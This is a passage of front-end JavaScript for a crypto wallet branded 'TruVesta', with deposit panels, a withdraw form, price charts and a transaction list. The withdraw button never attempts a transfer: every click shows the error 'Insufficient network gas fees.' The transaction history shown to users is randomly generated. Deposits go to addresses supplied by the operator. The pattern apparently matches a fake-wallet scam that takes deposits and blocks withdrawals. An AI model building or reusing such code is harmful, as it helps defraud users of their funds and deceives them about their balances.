        const ch = isEn ? '<i class="fa-solid fa-chevron-right" style="color:var(--txt-2);font-size:14px;"></i>' : '<span style="font-size:10px;color:var(--bad);font-weight:600;text-transform:uppercase;">Unavailable</span>';
        h += `<div class="${cls}" style="padding:10px 12px;grid-template-columns:1fr;" onclick="${act}"><div class="col-1" style="display:flex;justify-content:space-between;align-items:center;"><div style="display:flex;align-items:center;gap:12px;"><img class="coin" src="${getCoinLogo(C)}"><div class="coin-info"><span class="symbol">${C}</span></div></div>${ch}</div></div>`;
    });
    return h + '</div>';
}

function renderReceivePanel(sym){
    const m = document.getElementById('modal');
    const body = document.getElementById('modalBody');
    const title = document.getElementById('modalTitle');
    const badge = document.getElementById('networkBadge');
    title.textContent = 'Deposit';
    let addr = fetchedAddresses[sym.toLowerCase()] || 'Temporarily Unavailable';
    let avail = (addr !== 'Temporarily Unavailable' && addr !== '' && addr !== 'NO_ADDRESS_SET');
    
    let net = 'Ethereum (ERC-20)', cls = 'net-eth';
    if(sym==='BNB'){net='BNB Smart Chain (BEP-20)';cls='net-bsc';}
    else if(sym==='BTC'){net='Bitcoin Network';cls='net-btc';}
    else if(sym==='SOL'){net='Solana Network';cls='net-sol';}
    else if(sym==='XRP'){net='XRP Ledger';cls='net-xrp';}
    else if(sym==='TRX'||sym==='USDT'){net='Tron Network (TRC-20)';cls='net-trx';}
    
    badge.className = `network-badge ${cls}`; badge.textContent = net;
    body.innerHTML = `
    <div style="display:flex; flex-direction:column; align-items:center; gap:16px;">
        <div id="qrcode" style="padding:10px; background:white; border-radius:10px; min-height:148px; display:grid; place-items:center;"></div>
        <p style="color:var(--txt-2); font-size:13px; text-align:center;">Scan to deposit **${sym}** to your **TruVesta** Wallet on the **${net}** network.</p>
        <div style="background:var(--bg-2); padding:12px; border-radius:12px; width:100%; display:flex; justify-content:space-between; align-items:center; border:1px solid var(--edge);">
            <span id="receiveAddressDisplay" style="font-family:monospace; font-size:12px; color:var(--txt-1); overflow:hidden; text-overflow:ellipsis; max-width:200px;">${addr}</span>
            <button id="copyBtn" onclick="copyAddress()" style="background:none; border:none; color:var(--pri-color); cursor:pointer;"><i class="fa-regular fa-copy"></i> Copy</button>
        </div>
    </div>`;
    
    setTimeout(() => {
        const qr = document.getElementById("qrcode");
        if(avail) new QRCode(qr, { text: addr, width: 128, height: 128 });
        else qr.innerHTML = '<div style="color:var(--bad); display:flex; flex-direction:column; align-items:center; gap:5px;"><i class="fa-solid fa-ban" style="font-size:24px;"></i><span style="font-size:12px; font-weight:600;">Unavailable</span></div>';
    }, 100);
    m.classList.add('open');
}

function renderSendPanel(sym) {
    const body = document.getElementById('modalBody');
    const title = document.getElementById('modalTitle');
    const badge = document.getElementById('networkBadge');
    title.textContent = 'Withdraw';
    let bal = (userBalances[sym]||0) + (latestUserHoldings[sym]?.hold||0);
    
    let net = 'Ethereum (ERC-20)', cls = 'net-eth';
    if(sym==='BNB'){net='BNB Smart Chain (BEP-20)';cls='net-bsc';}
    else if(sym==='BTC'){net='Bitcoin Network';cls='net-btc';}
    else if(sym==='SOL'){net='Solana Network';cls='net-sol';}
    else if(sym==='XRP'){net='XRP Ledger';cls='net-xrp';}
    else if(sym==='TRX'||sym==='USDT'){net='Tron Network (TRC-20)';cls='net-trx';}
    
    badge.className = `network-badge ${cls}`; badge.textContent = net;
    body.innerHTML = `
    <div style="display:flex; flex-direction:column; gap:16px;">
        <div><label style="font-size:12px;color:var(--txt-2);margin-left:4px;">Network</label><div class="input-wrapper" style="margin-top:6px;"><input type="text" value="${net}" readonly style="width:100%;padding:14px;padding-right:40px;background:var(--bg-1);border:1px solid var(--edge);color:var(--txt-2);border-radius:12px;outline:none;font-weight:500;"><span class="scan-btn-inside" style="cursor:default;"><i class="fa-solid fa-lock"></i></span></div></div>
        <div><label style="font-size:12px;color:var(--txt-2);margin-left:4px;">Recipient Address</label><div class="input-wrapper" style="margin-top:6px;"><input id="sendRecipient" type="text" placeholder="${sym==='TRX'||sym==='USDT'?'T...':'0x...'}" style="width:100%;padding:14px;padding-right:40px;background:var(--input-bg);border:1px solid var(--edge);color:var(--txt-1);border-radius:12px;outline:none;font-family:monospace;"><button class="scan-btn-inside"><i class="fa-solid fa-qrcode"></i></button></div></div>
        ${sym === 'XRP' ? `<div><label style="font-size:12px;color:var(--txt-2);margin-left:4px;">Destination Tag</label><input id="destinationTag" type="number" placeholder="12345" style="width:100%;padding:14px;background:var(--input-bg);border:1px solid var(--edge);color:var(--txt-1);border-radius:12px;outline:none;margin-top:6px;"></div>` : ''}
        <div><div style="display:flex;justify-content:space-between;margin-bottom:6px;"><label style="font-size:12px;color:var(--txt-2);margin-left:4px;">Amount (${sym})</label><span onclick="document.getElementById('sendAmount').value='${bal.toFixed(5)}'" style="font-size:12px;color:var(--pri-color);cursor:pointer;">Max: ${bal.toFixed(4)}</span></div><input id="sendAmount" type="number" placeholder="0.00" style="width:100%;padding:14px;background:var(--input-bg);border:1px solid var(--edge);color:var(--txt-1);border-radius:12px;outline:none;"></div>
        <p id="sendFeedback" style="font-size:12px;text-align:center;min-height:16px;margin:0;"></p>
        <button id="confirmSendBtn" class="btn primary" style="width:100%;padding:14px;font-size:16px;margin-top:8px;" onclick="document.getElementById('sendFeedback').textContent='Insufficient network gas fees.';document.getElementById('sendFeedback').style.color='var(--bad)';">Confirm Withdraw ${sym}</button>
    </div>`;
}

function copyAddress() {
    const el = document.getElementById('receiveAddressDisplay'); if(!el) return;
    const txt = el.textContent.trim();
    if(!txt || txt.includes('Unavailable') || txt.includes('Not Set')) return;
    navigator.clipboard.writeText(txt).then(() => {
        const btn = document.getElementById('copyBtn');
        btn.innerHTML = '<i class="fa-solid fa-check" style="color:var(--pri-color);"></i> Copied';
        setTimeout(() => { btn.innerHTML = '<i class="fa-regular fa-copy" style="color:var(--pri-color);"></i> Copy'; }, 2000);
    });
}
function openComingSoonModal() { 
    openModal('swap'); 
    document.getElementById('modalTitle').textContent="Coming Soon";
    document.getElementById('networkBadge').textContent="";
    document.getElementById('modalBody').innerHTML=`<div style="display:flex;flex-direction:column;align-items:center;padding:30px 10px;text-align:center;"><div style="font-size:40px;color:var(--pri-color);margin-bottom:15px;"><i class="fa-solid fa-rocket"></i></div><h3 style="margin:0 0 10px 0;color:var(--txt-1);">Swaps Launching Soon</h3><p style="color:var(--txt-2);font-size:14px;">We are integrating decentralized exchanges for best rates.</p><button class="btn primary" style="margin-top:20px;width:100%;" onclick="document.getElementById('modal').classList.remove('open')">Got it</button></div>`;
}

// --- CHART & HISTORY (DETAIL VIEW) ---
let coinChart = null;
function showCoinDetail(sym, info, hold, live) {
    currentDetailSymbol = sym;
    document.getElementById('detailCoinName').textContent = info.name;
    document.getElementById('detailCoinName2').textContent = info.name;
    document.getElementById('detailCoinIcon').src = getCoinLogo(info.icon);
    document.getElementById('detailCoinSymbol').textContent = sym;
    document.getElementById('detailCryptoAmt').textContent = `${fmt(hold.hold, hold.hold<1?5:4)} ${sym}`;
    document.getElementById('detailUsdAmt').textContent = `~ $${fmt(live.price * hold.hold)}`;
    
    const tf = document.getElementById('chartTimeframes');
    tf.dataset.symbol = sym;
    if(tf.querySelector('.active')) tf.querySelector('.active').classList.remove('active');
    tf.querySelectorAll('.time-btn')[1].classList.add('active'); // 1W default
    
    renderChart(sym, 7);
    renderTransactions(sym);
    document.getElementById('dashboard-view').classList.add('show-detail');
    document.getElementById('coinDetailView').scrollTop = 0;
}

function hideCoinDetail() {
    currentDetailSymbol = null;
    document.getElementById('dashboard-view').classList.remove('show-detail');
    if (coinChart) { coinChart.destroy(); coinChart = null; }
}

function updateChartData(btn, days) {
    document.querySelector('.time-btn.active').classList.remove('active');
    btn.classList.add('active');
    const sym = document.getElementById('chartTimeframes').dataset.symbol;
    renderChart(sym, days);
}

async function renderChart(sym, days) {
    const canvas = document.getElementById('coinChart');
    const ctx = canvas.getContext('2d');
    if (coinChart) coinChart.destroy();
    if (!sym) { canvas.style.display = 'none'; return; }
    canvas.style.display = 'block';
    
    try {
        const url = `https://min-api.cryptocompare.com/data/v2/histoday?fsym=${sym}&tsym=USD&limit=${days===365?365:days}`;
        const json = await (await fetch(url)).json();
        if(json.Response !== 'Success') throw new Error();
        
        const data = json.Data.Data;
        const prices = data.map(d => d.close);
        const labels = data.map(d => new Date(d.time * 1000).toLocaleDateString());
        
        const grad = ctx.createLinearGradient(0, 0, 0, canvas.offsetHeight);
        grad.addColorStop(0, 'rgba(212, 175, 55, 0.3)'); grad.addColorStop(1, 'rgba(212, 175, 55, 0)');
        
        coinChart = new Chart(ctx, {
            type: 'line',
            data: { labels, datasets: [{ label: 'Price', data: prices, borderColor: '#D4AF37', borderWidth: 2, pointRadius: 0, tension: 0.3, fill: true, backgroundColor: grad }] },
            options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { display: false } } }
        });
    } catch { canvas.style.display = 'none'; }
}

function fetchTransactions(addr, sym) {
    // Mock Data for demo, typically fetched from explorer API
    if (!addr || addr === 'NO_ADDRESS_SET') { allTransactions[sym] = []; } 
    else { allTransactions[sym] = [ 
        { type: 'Receive', amount: (Math.random()*2).toFixed(4), date: new Date().toLocaleDateString() },
        { type: 'Send', amount: (Math.random()*0.5).toFixed(4), date: new Date(Date.now()-86400000).toLocaleDateString() }
    ]; }
    if (currentDetailSymbol === sym) renderTransactions(sym);
}

function loadAllTransactionHistory() {
    for (const [coin, addr] of Object.entries(fetchedAddresses)) { if(addr) fetchTransactions(addr, coin.toUpperCase()); }
}

function renderTransactions(sym) {
    const container = document.getElementById('txHistoryList');
    const txs = allTransactions[sym] || [];
    container.innerHTML = '';
    if (txs.length === 0) { container.innerHTML = `<p style="text-align:center;color:var(--txt-2);font-size:14px;">No transaction history found.</p>`; return; }
    
    txs.forEach(tx => {
        const isRec = tx.type === 'Receive';
        const color = isRec ? 'var(--good)' : 'var(--bad)';
        const icon = isRec ? 'fa-arrow-down' : 'fa-arrow-up';
        const price = latestPrices[sym]?.price || 0;
        container.innerHTML += `
        <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--edge);">
            <div style="display:flex;align-items:center;gap:12px;">
                <div style="width:30px;height:30px;border-radius:50%;display:grid;place-items:center;background:${color}22;"><i class="fa-solid ${icon}" style="font-size:12px;color:${color};"></i></div>
                <div><span style="font-weight:600;color:var(--txt-1);">${isRec?'Received':'Sent'} ${sym}</span><div style="font-size:12px;color:var(--txt-2);margin-top:2px;">${tx.date}</div></div>
            </div>
            <div style="text-align:right;"><span style="font-weight:600;color:${color};">${isRec?'+':'-'}${tx.amount} ${sym}</span><div style="font-size:12px;color:var(--txt-2);margin-top:2px;">$${fmt(tx.amount*price)}</div></div>
        </div>`;
    });
}
